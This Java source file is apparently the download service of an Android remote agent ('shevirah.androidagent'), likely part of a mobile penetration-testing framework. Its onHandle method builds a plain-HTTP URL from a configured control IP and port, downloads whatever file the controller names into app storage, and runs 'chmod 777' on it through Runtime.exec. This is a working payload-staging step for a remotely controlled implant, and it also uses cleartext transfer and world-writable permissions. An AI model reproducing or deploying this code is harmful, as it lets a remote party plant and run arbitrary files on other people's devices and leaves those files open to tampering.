package com.shevirah.androidagent;

import android.app.IntentService;
import android.content.Intent;
import android.util.Log;
import java.io.File;

import static com.shevirah.androidagent.Util.logRequest;
import static com.shevirah.androidagent.Util.printExtras;

public class DownloadService extends IntentService {
    private static final String TAG = "DownloadService";

    public static final String EXTRA_FILENAME = "filename";
    public static final String EXTRA_PATH = "path";
    public static final String HTTP_PREFIX = "http://";
    public DownloadService() {
        super(TAG);
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (Const.DEBUG) printExtras(TAG, intent.getExtras(), "args ");

        try {
            onHandle(intent);
        } catch (Exception e) {
            if (Const.DEBUG) Log.e(TAG, "onHandleIntent: ", e);
        }
    }

    private void onHandle(Intent intent) {
        String fileName = intent.getStringExtra(EXTRA_FILENAME);
        String path = intent.getStringExtra(EXTRA_PATH);
           String myport = getString(R.string.controlport);
             String baseUrl = "";
             if (myport.equals("80"))
             {
             baseUrl = HTTP_PREFIX + getString(R.string.controlIP) + path + fileName;
             }
             else
             {
              	baseUrl = HTTP_PREFIX + getString(R.string.controlIP) + ":" + myport + path + fileName;
             }
        
        String urlString = baseUrl;

        HttpRequest request = HttpRequest.get(urlString);
        if (!request.ok()) {
            if (Const.DEBUG) logRequest(TAG, request.code(), request.body(), urlString);
            return;
        }

        File file = new File(getFilesDir(), fileName);
        request.receive(file);

        if (Const.DEBUG) {
            logRequest(TAG, request.code(), "<raw data>", urlString);
            Log.d(TAG, "file received " + file.getAbsolutePath());
        }

        makeFileVisibleForAll(file);
    }

    private void makeFileVisibleForAll(File file) {
        String command = "chmod 777 " + file.getAbsolutePath();
        try {
            Runtime.getRuntime().exec(command);
        } catch (Exception e) {
            if (Const.DEBUG) Log.e(TAG, "chmod 777 failed ", e);
        }
    }
}
